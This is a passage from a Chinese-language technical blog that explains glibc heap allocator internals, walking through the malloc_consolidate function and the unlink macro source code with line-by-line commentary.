class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">clear_fastchunks(av);</span><br><span class="line">unsorted_bin = unsorted_chunks(av);</span><br><span class="line">maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">fb = &amp;fastbin (av, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>清除<code>malloc_state</code>中的<code>fastbin</code>相关的标志位，表示该分配区中不包含<code>fast bin</code>，获取<code>unsorted bin</code>链表的头指针。获取<code>fastbin</code>中表示最大和最小<code>chunk</code>链表的头指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">         ...</span><br><span class="line">        &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br></pre></td></tr></table></figure><p>接着对<code>fastbin</code>中表示每个大小的<code>chunk</code>链表执行相同的操作，直到所有的<code>fastbin</code>都处理完毕。</p><p>首先是将当前的<code>fastbin</code>链表的头指针赋值给<code>p</code>，并将指针置为<code>0</code>表示该<code>fastbin</code>链表不包含任何的<code>chunk</code>。这里用到的是<code>atomic_exchange_acq</code>函数，即比较和替换函数。若<code>fastbin</code>当前链表不为空，则对每一个<code>chunk</code>执行下面的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span></span><br><span class="line">check_inuse_chunk(av, p);</span><br><span class="line">nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br></pre></td></tr></table></figure><p>首先对当前的<code>chunk</code>调用<code>check_inuse_chunk</code>进行检查，主要是调用<code>do_check_chunk</code>检查了<code>chunk</code>是否在<code>min_address</code>和<code>max_address</code>之间，并检查了物理相邻的下一个<code>chunk</code>的<code>prev_inuse</code>位是否为<code>1</code>。接着获取了该<code>chunk</code>的<code>size</code>，和物理相邻的下一个<code>chunk</code>的起始地址以及<code>chunk_size</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断物理相邻的上一个<code>chunk</code>是否是空闲的，若是空闲的则将这两个<code>chunk</code>合并，并调用<a href="#unlink">unlink</a>函数将上一个<code>chunk</code>从链表中删除。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着就是判断当前的<code>chunk</code>（或者是合并完之后的<code>chunk</code>）是否和<code>top chunk</code>相邻。若与<code>top chunk</code>相邻，则将当前的<code>chunk</code>与<code>top chunk</code>进行合并。并设置<code>top chunk</code>的<code>prev_inuse</code>位为<code>1</code>。如果与<code>top chunk</code>不相邻则执行下面的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">unsorted_bin-&gt;fd = p;</span><br><span class="line">first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_head(p, size | PREV_INUSE);</span><br><span class="line">p-&gt;bk = unsorted_bin;</span><br><span class="line">p-&gt;fd = first_unsorted;</span><br><span class="line">set_foot(p, size);</span><br></pre></td></tr></table></figure><p>判断当前<code>chunk</code>物理相邻的下一个<code>chunk</code>是否是空闲的，若是空闲的则继续合并，若不是空闲的则清除下一个<code>chunk</code>的<code>prev_inuse</code>位，表示当前的<code>chunk</code>已经是空闲的了。并将当前的<code>chunk</code>插入到<code>unsorted bin</code>的链表头部，并设置当前<code>chunk</code>的<code>prev_inuse</code>为<code>1</code>，下一个<code>chunk</code>的<code>prev_size</code>为当前的<code>size</code>。</p><p>这样<code>malloc_consolidate</code>函数就完成了。</p><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><ol><li>首先通过<code>get_max_fast</code>判断堆是否初始化，若未初始化，则初始化堆，否则进入下一步。</li><li>将<code>malloc_state</code>中表示<code>fastbin</code>中含有空闲<code>chunk</code>的标志位清空，进入下一步。</li><li>对<code>fast bin</code>中的每个<code>chunk</code>进行下列操作<ol><li>与其物理相邻的<code>chunk</code>进行前向合并</li><li>若与<code>top chunk</code>相邻，则与<code>top chunk</code>进行合并</li><li>与其物理相邻的<code>chunk</code>进行后向合并</li></ol></li></ol><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action,      \</span></span><br><span class="line"><span class="meta">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">       P, AV);      \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>函数主要是将传入的<code>chunk</code>指针指向的<code>chunk</code>从当前的空闲链表中删除，注意到这里进行了双向链表的完整性检查<code>if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</code>。</p><p>如果<code>chunk</code>的大小是<code>largebin</code>的范围内，需要对<code>fd_nextsize,bk_nextsize</code>进行操作，共分为三种情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;      \</span><br><span class="line">    <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span><br><span class="line">      FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="line">    <span class="keyword">else</span> &#123;      \</span><br><span class="line">        ...</span><br><span class="line">      &#125;      \</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;      \</span><br><span class="line">    ...\</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>第一种情况是<code>largebin</code>链表中仅存在一组相同的<code>chunk</code>，则移除首<code>chunk</code>，将后记<code>chunk</code>的<code>nextsize</code>指向其本身。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;      \</span><br><span class="line">    <span class="keyword">if</span> (P-&gt;fd_nextsize == P)</span><br><span class="line">        ...\</span><br><span class="line">    <span class="keyword">else</span> &#123;      \</span><br><span class="line">        FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">        FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">        P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="line">        P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="line">      &#125;      \</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;      \</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>第二种情况则是存在多组不同大小的<code>chunk</code>，需要<code>unlink</code>的<code>chunk</code>大小为多个，则要将首<code>chunk</code>的<code>fd_nextsize,bk_nextsize</code>拷贝到后继<code>chunk</code>中，接着需要将上一个和下一个不同大小的堆块的<code>fd_nextsize,bk_nextsize</code>指向后继<code>chunk</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>)&#123;</span><br><span class="line">    ...\</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;      \</span><br><span class="line">    P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">    P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>第三种情况则是存在多组不同大小的<code>chunk</code>，但是<code>unlink</code>大小的<code>chunk</code>只有一个。此时只需要将上一个和下一个不同大小的<code>chunk</code>的<code>fd_nextsize,bk_nextsize</code>修改即可。</p><h2 id="sbrk"><a href="#sbrk" class="headerlink" title="sbrk"></a>sbrk</h2><p><code>sbrk,mmap,munmap</code>函数之后补</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
